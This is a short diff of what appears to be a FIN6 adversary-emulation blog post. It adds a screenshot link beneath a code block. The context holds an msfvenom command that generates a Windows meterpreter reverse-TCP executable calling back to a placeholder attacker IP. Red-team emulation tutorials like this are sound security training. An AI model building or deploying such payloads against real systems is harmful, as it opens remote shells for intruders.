@@ -47,6 +47,7 @@ Below is the typical syntax to use msfvenom:
 ```bash
 ./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker IP] lport=4444 -f exe -o /tmp/my_payload.exe
 ```
+![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfVenom_Payload.png){:width="100%"}
 
 ## Step 2 - FIN6 Discovery
 
